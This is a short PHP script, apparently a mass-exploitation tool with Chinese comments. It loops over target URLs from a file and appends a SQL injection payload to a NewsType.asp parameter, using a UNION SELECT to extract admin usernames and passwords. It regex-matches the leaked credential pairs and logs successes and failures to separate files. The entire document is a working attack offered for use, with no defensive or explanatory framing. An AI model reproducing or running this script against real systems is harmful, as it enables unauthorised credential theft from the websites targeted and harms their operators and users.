<?php
	$urlArray=file("url.txt");
	
	foreach($urlArray as $key){
		$key=trim($key);
		$url=trim($key);
		$pyload="/NewsType.asp?SmallClass='%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20''='";
		$exp=$url.$pyload;
		curlData($key,$exp);
	}

	function curlData($key,$exp){
		$preg='/\w+\|\w+/';
		$url=$exp;
		$timeout=300;
		$ch=curl_init();
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);			//设置传输的模式 1 可以不渲染
		curl_setopt($ch,CURLOPT_URL, $url);
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);	//发起连接后等待的时间
		$handles=curl_exec($ch);
		curl_close($ch);
		if(preg_match($preg,$handles)){
			preg_match_all("/\w+\|\w+/",$handles,$re);
			$arr=array_unique($re[0]);
			$fp=fopen("luck.txt","a+");
			foreach($arr as $v){
				print("$key======================>$v\r\n");
				fwrite($fp,$key."======================>".$v."\r\n");
			}
		}else{
			print("$key======================>Failed!!!");
			$fp=fopen("unluck.txt","a+");
			fwrite($fp,$key."======================>Failed!!!\r\n");
		}
	}
	
	
?>
